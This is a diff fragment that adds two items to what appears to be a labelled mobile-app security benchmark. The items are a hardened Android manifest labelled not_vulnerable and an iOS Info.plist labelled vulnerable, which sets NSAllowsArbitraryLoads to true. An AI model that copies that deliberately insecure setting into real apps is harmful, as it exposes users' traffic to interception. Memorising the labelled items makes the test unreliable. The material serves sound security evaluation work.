+    "id": "RF-reme-AndroidManifest",
+    "track": "app",
+    "module": "04-deep-link-verification",
+    "label": "not_vulnerable",
+    "prompt": "Provide the AndroidManifest.xml for the application.",
+    "files": {
+      "AndroidManifest.xml": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<manifest xmlns:android=\"http://schemas.android.com/apk/res/android\">\n  <application\n      android:allowBackup=\"false\"\n      android:usesCleartextTraffic=\"false\"\n      android:networkSecurityConfig=\"@xml/network_security_config\">\n    <activity android:name=\".MainActivity\" android:exported=\"true\" android:taskAffinity=\"\">\n      <intent-filter android:autoVerify=\"true\">\n        <action android:name=\"android.intent.action.VIEW\" />\n        <category android:name=\"android.intent.category.DEFAULT\" />\n        <category android:name=\"android.intent.category.BROWSABLE\" />\n        <data android:scheme=\"https\" android:host=\"links.example.com\" />\n      </intent-filter>\n    </activity>\n  </application>\n</manifest>\n"
+    }
+  },
+  {
+    "id": "RF-vuln-Info",
+    "track": "app",
+    "module": "03-binary-trust-and-gateways",
+    "label": "vulnerable",
+    "prompt": "Provide the iOS Info.plist for the application.",
+    "files": {
+      "Info.plist": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<plist version=\"1.0\">\n<dict>\n  <key>NSAppTransportSecurity</key>\n  <dict>\n    <key>NSAllowsArbitraryLoads</key>\n    <true/>\n  </dict>\n</dict>\n</plist>\n"
+    }
+  }
+]
